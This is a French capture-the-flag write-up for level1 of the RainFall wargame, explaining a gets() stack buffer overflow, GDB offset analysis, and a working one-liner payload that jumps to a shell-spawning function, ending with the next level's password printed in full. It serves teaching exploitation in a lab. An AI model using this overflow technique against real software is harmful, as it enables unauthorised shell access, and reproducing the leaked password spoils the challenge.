# Level1 : Exploitation de gets() pour un Accès Shell Non Autorisé

## Analyse du Binaire

Le programme `level1` contient une vulnérabilité simple de type *buffer overflow*. En examinant le code source :

```c
#include <stdio.h>

int main(void)
{
  /* Buffer de 76 octets alloué sur la pile (stack) */
  char buffer[76];

  /* gets() lit l'entrée depuis stdin SANS vérification de limite */
  gets(buffer);

  return 0;
}

void run(void)
{
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
  return;
}
```

La vulnérabilité clé est l'utilisation de `gets()`, qui lit l'entrée utilisateur sans aucune limitation de taille dans un *buffer* de taille fixe. Pour cette raison, `gets` est intrinsèquement dangereuse et a été retirée de la norme C11.

## Explication de la Vulnérabilité

Cela crée une vulnérabilité de *buffer overflow* car :

1. Le tableau `buffer` ne fait que 76 octets de long.
2. `gets()` continuera de lire l'entrée au-delà de ces 76 octets.
3. Les données dépassant le *buffer* écraseront la mémoire adjacente sur la pile (*stack*).
4. Cela inclut l'écrasement de l'adresse de retour sauvegardée, nous permettant de détourner le flux d'exécution du programme.
5. En écrasant l'adresse de retour avec l'adresse de `run()`, nous pouvons rediriger l'exécution vers cette fonction, qui appelle `system("/bin/sh")`, nous donnant ainsi un *shell*.

## Localisation de la Fonction Cible

D'abord, nous utilisons GDB pour trouver l'adresse mémoire de la fonction `run()` :

```bash
level1@RainFall:~$ gdb -q ./level1
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Nous trouvons que `run()` est située à l'adresse `0x8048444`. Cette fonction sera notre cible puisqu'elle appelle `system("/bin/sh")`.

## Création de l'Exploit

Notre *exploit* doit :

1. Remplir le *buffer* de 76 octets.
2. Écraser l'adresse de retour avec l'adresse de `run()`.

### Comprendre le Format Little-Endian

Sur l'architecture x86 (utilisée par le binaire), les adresses mémoire sont stockées au format *little-endian*. Cela signifie que l'octet le moins significatif (*least significant byte*) est stocké à l'adresse mémoire la plus basse.

Pour notre adresse `0x08048444` :

- En *big-endian* : `08 04 84 44`
- En *little-endian* : `44 84 04 08`

Nous devons utiliser le format *little-endian* dans notre *payload* car c'est ainsi que le processeur interprétera les octets lors de la lecture de l'adresse de retour depuis la pile (*stack*).

### Analyse du Buffer Overflow avec GDB

La session GDB fournit des informations cruciales sur le fonctionnement de la vulnérabilité de *buffer overflow* dans le binaire `level1`. Décomposons ce que nous observons :

#### Analyse du Désassemblage

Le désassemblage montre :
```
(gdb) disas main
   0x08048486 <+6>:     sub    $0x50,%esp       # Alloue 80 octets sur la pile (stack)
   0x08048489 <+9>:     lea    0x10(%esp),%eax  # Le buffer commence 16 octets plus loin
   0x0804848d <+13>:    mov    %eax,(%esp)      # Passe l'adresse du buffer à gets()
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret                     # Instruction de retour
```
```
(gdb) b *0x08048496
Breakpoint 1 at 0x8048496 # Définit un point d'arrêt (breakpoint) à l'instruction de retour. Le programme arrêtera son exécution ici.
```

## Vérification de l'Exploit

```
level1@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test
```

Nous avons créé un motif de :
- 76 caractères 'A' (pour remplir le *buffer*)
- 4 caractères 'B' (pour écraser l'adresse de retour)
- 4 caractères 'C' et 4 caractères 'D' (données de test supplémentaires)

Après avoir exécuté jusqu'à l'instruction `ret` :

```
(gdb) run < /tmp/test # Exécute le programme avec notre entrée de test
Starting program: /home/user/level1/level1 < /tmp/test

Breakpoint 1, 0x08048496 in main ()
(gdb) info frame
Stack level 0, frame at 0xbffff640:
 eip = 0x8048496 in main; saved eip 0x42424242
```

La valeur de **saved eip** est `0x42424242`, ce qui correspond au code ASCII pour "BBBB". Cela confirme :

1. Notre *buffer overflow* a réussi à écraser l'adresse de retour.
2. Le décalage (*offset*) est exactement de 76 octets (les 'B' commencent à la position 77).
3. L'adresse de retour est stockée à l'emplacement mémoire `0xbffff63c`.

## Construction de l'Exploit

Cela confirme que notre *exploit* nécessite :
- 76 octets de remplissage (*padding*).
- L'adresse de `run()` (`0x08048444`) au format *little-endian*.

Au lieu de retourner à l'adresse `0x42424242` (BBBB), nous pouvons la remplacer par `"\x44\x84\x04\x08"` pour rediriger l'exécution vers la fonction `run()`, qui fournira un *shell*.

La session GDB valide que notre commande d'*exploit* est correctement formatée :
```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

Décomposons cela :

- `python -c '...'` : L'option `-c` permet d'exécuter du code Python directement depuis la ligne de commande.
- `print "A"*76` : Crée 76 caractères 'A' pour remplir le *buffer*.
- `"\x44\x84\x04\x08"` : La représentation *little-endian* de l'adresse de la fonction `run()`.
- `cat` sans arguments : Maintient `stdin` ouvert après l'envoi du *payload* de l'*exploit*.
- Redirection (`|`) de la sortie vers `./level1` : Fournit notre *payload* à l'`stdin` du programme.

### Pourquoi avons-nous besoin de `cat` ?

La commande `cat` est cruciale car :

1. Lorsque l'*exploit* réussit et que `system("/bin/sh")` s'exécute, le *shell* a besoin d'un `stdin` ouvert pour recevoir des commandes.
2. Sans `cat`, `stdin` se fermerait après l'envoi de l'*exploit*, provoquant la fermeture immédiate du *shell*.
3. Avec `cat`, `stdin` reste ouvert, nous permettant d'interagir avec le *shell* généré.

## Exploitation Réussie

Lorsque nous exécutons notre *exploit* :

```bash
level1@RainFall:~$ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
```

Nous voyons le message de la fonction `run()`, confirmant que notre *exploit* a fonctionné. Maintenant, nous pouvons récupérer le mot de passe :

```bash
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Ce mot de passe nous permet de passer au `level2`.
